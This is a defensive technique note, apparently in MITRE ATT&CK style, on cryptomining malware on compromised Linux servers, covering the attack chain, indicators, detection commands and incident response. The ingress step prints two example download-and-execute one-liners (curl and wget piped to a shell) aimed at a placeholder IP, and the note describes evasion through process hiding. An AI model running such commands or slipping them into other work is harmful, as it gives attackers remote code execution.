---
id: technique-t1496
title: "Resource hijacking: cryptomining malware on compromised Linux servers"
publisher: MITRE ATT&CK / technique note
published: 2025-06-11
lang: en
severity: high
mitre: [T1496, T1059.004, T1105, T1543.002]
keywords:
  - cryptomining
  - クリプトマイニング
  - xmrig
  - resource hijacking
  - リソース不正利用
  - monero
  - stratum
  - curl pipe bash
  - 任意コード実行
---

## Summary

Cryptomining is the most common monetisation of an opportunistically compromised
Linux server, and it is loud: sustained 100% CPU is impossible to hide. That makes
it easy to detect and easy to misprioritise. **A miner is not the incident — it is
evidence of the incident.** The access that installed it is still open, and the same
foothold is frequently sold on or reused for something quieter.

## The typical chain

1. **Initial access** — SSH brute force succeeds, or an exposed service is exploited.
2. **Ingress tool transfer (T1105) and execution (T1059.004)** — almost always a
   single line:

   ```
   curl -s http://198.51.100.99/x.sh | bash
   wget -qO- http://198.51.100.99/x.sh | sh
   ```

   A download piped directly into a shell is unambiguous: the content is never
   written to disk, never inspected, and executes with the caller's privileges.
   There is no legitimate administrative reason to do this on a production host.
3. **Defence evasion** — the dropper commonly kills competing miners, disables
   auditd, clears history, and installs a `libprocesshider`-style `LD_PRELOAD` hook
   so the miner does not appear in `ps`.
4. **Persistence (T1543.002 / T1053.003)** — a systemd unit or cron entry.
5. **Resource hijacking (T1496)** — the miner connects to a pool.

## Indicators

Process and binary names: `xmrig`, `xmrigDaemon`, `minerd`, `cpuminer`, `kdevtmpfsi`,
`kinsing`, `sysupdate`, and generically-named binaries in `/tmp`, `/dev/shm`, or
`/var/tmp`.

Network: outbound TCP to pool ports **3333, 4444, 5555, 7777, 14444** and any
`stratum+tcp://` URL. Pool hostnames include `pool.supportxmr.com`,
`xmr.nanopool.org`, `pool.minexmr.com`.

```bash
sudo ss -tanp | grep -E ':(3333|4444|5555|7777|14444)\b'
top -b -n1 -o %CPU | head -15
sudo ls -la /tmp /dev/shm /var/tmp
sudo lsof /dev/shm 2>/dev/null
```

Because the process may be hidden from `ps`, compare kernel and userspace views:

```bash
# PIDs the kernel knows about that ps does not report
comm -13 <(ps -eo pid --no-headers | tr -d ' ' | sort) <(ls /proc | grep -E '^[0-9]+$' | sort)
cat /etc/ld.so.preload 2>/dev/null     # should not exist on a clean Ubuntu host
```

A non-empty `/etc/ld.so.preload` on a default Ubuntu install is by itself grounds to
treat the host as compromised.

## Response

The instinct is to kill the miner. That is the wrong first step: it destroys
volatile evidence and tells the attacker they have been noticed, and the persistence
mechanism will restart it within a minute anyway.

Correct order:

1. **Isolate the host at the network layer** — this stops both the mining and any
   further attacker interaction, without alerting a process on the host.
2. **Capture volatile evidence** before any reboot: `/proc/<pid>/exe`,
   `/proc/<pid>/cmdline`, `/proc/<pid>/environ`, open sockets, loaded modules.
3. **Find and document the persistence** (see the persistence technique note).
4. **Identify initial access** from authentication logs, and only trust logs you
   have an off-host copy of.
5. **Rebuild.** A host that ran attacker-controlled code as root cannot be
   cleaned with confidence. Rotate every credential and key that was present on it.

## Severity rationale

Score cryptomining as high-to-critical not because of the CPU cost but because its
presence proves arbitrary code execution already happened. The availability impact
is the least interesting thing about it.
